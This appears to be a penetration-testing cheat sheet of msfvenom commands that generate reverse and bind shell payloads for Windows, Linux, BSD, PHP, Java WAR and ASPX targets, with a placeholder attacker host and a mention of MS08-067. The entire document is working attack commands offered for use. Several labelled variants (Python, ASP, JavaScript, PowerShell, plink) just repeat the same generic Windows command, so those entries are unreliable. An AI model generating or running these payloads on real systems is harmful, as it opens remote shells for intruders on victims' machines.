# **msf**

ms08-67  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# PHP reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x  
  
# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x  
msfvenom -p java/jsp_shell_reverse_tcp LHOST LPORT -f war > war  
  
# Linux bind shell  
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai  
  
# Linux FreeBSD reverse shell  
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=x.x.x.x  
  
# Linux C reverse shell  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows non staged reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows Staged (Meterpreter) reverse shell  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x  
  
# Windows Python reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows ASP reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows ASPX reverse shell  
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows JavaScript reverse shell with nops  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows Powershell reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows reverse shell excluding bad characters  
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=x.x.x.x  
  
# Windows x64 bit reverse shell  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x  
  
# Windows reverse shell embedded into plink  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x